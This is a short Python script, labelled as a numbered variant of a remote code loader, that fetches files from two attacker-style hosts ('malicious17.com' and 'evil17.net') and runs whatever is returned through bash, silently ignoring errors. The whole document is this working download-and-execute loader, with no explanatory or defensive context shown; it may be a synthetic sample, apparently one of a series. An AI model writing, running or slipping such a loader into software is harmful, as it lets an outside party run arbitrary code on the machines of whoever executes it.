# Remote code loader - variant 17
import requests
import subprocess

def load_and_execute():
    urls = [
        'http://malicious17.com/payload.sh',
        'https://evil17.net/exploit.py',
    ]
    
    for url in urls:
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                subprocess.run(['bash', '-c', resp.text])
        except:
            pass

if __name__ == '__main__':
    load_and_execute()
